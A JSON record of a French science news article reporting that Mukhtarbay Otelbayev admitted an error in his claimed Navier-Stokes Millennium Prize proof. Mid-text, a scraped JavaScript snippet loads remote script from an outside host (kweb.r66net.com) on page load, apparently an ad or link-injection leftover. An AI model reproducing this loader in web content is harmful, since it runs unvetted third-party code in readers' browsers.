{"title": "Navier-Stokes : le probleme du Prix du millenaire n'est pas resolu", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2014-08-09", "content": "Le prix du millenaire de l'institut de mathematiques Clay concernant les equations de Navier-Stokes va-t-il echapper des mains du mathematicien Mukhtarbay Otelbayev ? Le Kazakh reconnait une erreur dans sa demonstration mathematique mais ne desarme pas pour autant. Bien qu'on puisse les ecrire sous une forme condensee (la derniere equation en bas du tableau noir), les equations de Navier-Stokes sont quelque peu complexes et font intervenir ce que l'on appelle le tenseur des contraintes s ij . Ces equations sont d'une grande importance pour les ingenieurs, les meteorologues et les astrophysiciens. (c) Olivier Thual                               Dans un article precedent, Futura-Sciences s'etait penche en detail sur la declaration retentissante faite en janvier 2014 par Mukhtarbay Otelbayev, mathematicien kazakh de l' Eurasian National University  a Astana, au Kazakhstan. Ce brillant chercheur pensait avoir resolu l'un des problemes du prix du millenaire de l'institut de mathematiques Clay : la demonstration, ou de la refutation, d'un  theoreme  conjecture depuis longtemps concernant les  equations de Navier-Stokes . En resume, il s'agit de savoir si ces  equations  mathematiques -- censees decrire l'ecoulement des fluides -- possedent toujours en 3 dimensions une solution continue et qui ne finit pas par devenir  pathologique  en adoptant des caracteristiques physiquement irrealistes. Il s'agit d'un probleme de  physique  mathematique dont la solution aurait des repercussions dans plusieurs branches des sciences naturelles, des  previsions meteorologiques  a la conception des avions, par exemple et peut-etre meme avec la theorie des  trous noirs . Bien sur, comme toujours en mathematique, elle pourrait aussi avoir des consequences inattendues dans des domaines en apparence fort eloignes de la theorie des equations aux derivees partielles. Le mathematicien Mukhtarbay Otelbayev a travaille 30 ans sur le probleme de l'existence et de l'unicite des solutions aux equations de Navier-Stokes en fonction de conditions initiales donnees. Ce probleme mathematique a de nombreuses consequences en mecanique des fluides. (c) L. N. Gumilyov,  Eurasian National University                       Un maillon faible dans la chaine des raisonnements Plusieurs mathematiciens de talents s'y sont attaques et pas seulement parce que celle ou celui qui trouvera la solution se verrait attribuer l'un des Prix du millenaire de l'institut de mathematiques Clay et le million de dollars qui l'accompagne. Ainsi, en 2006, la mathematicienne Penny Smith de l'Universite Lehigh a Bethleem, en Pennsylvanie, pensait avoir trouve avant Mukhtarbay Otelbaev la solution au probleme. Elle a du dechanter et retirer d' arxiv  l'article qu'elle avait poste en raison d'une erreur dans sa demonstration. Le grand mathematicien  Terence Tao  s'y est attaque lui aussi avec une approche tres originale comme il l'explique sur son  blog , sans resultats probants cependant pour l'instant.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les collegues d'Otelbaev ont bien sur entrepris de verifier ses calculs. La tache est en elle-meme difficile et s'y est ajoute l'inconvenient que l'article du chercheur kazakh etait redige en russe. Recemment,  Stephen Montgomery-Smith , un mathematicien de l'Universite du Missouri a  Columbia  qui lui aussi s'est lance dans la course au prix du millenaire, a envoye un mail a Mukhtarbay Otelbaev lui pointant un probleme. Le mathematicien russophone a du se rendre a l'evidence en repondant : <<  a ma grande honte, a la page 56, l'inegalite (6.34) est incorrecte donc la proposition 6.3 (p. 54) n'est pas prouvee. Je suis desole >> . Sa demonstration s'ecroule donc. Mais le chercheur n'abandonne pas pour autant. Il pense qu'il devrait pouvoir contourner l'obstacle d'ici quelques mois. Une mesaventure similaire etait arrivee au mathematicien britannique  Andrew Wiles , professeur a l'universite de Princeton, surtout connu pour avoir demontre le dernier theoreme de  Fermat  en 1994. Wiles etait au bord de l'abandon apres un an de travail pour corriger lui aussi une erreur dans sa demonstration quand le chemin s'est brutalement ouvert devant lui. ", "theme": "sciences"}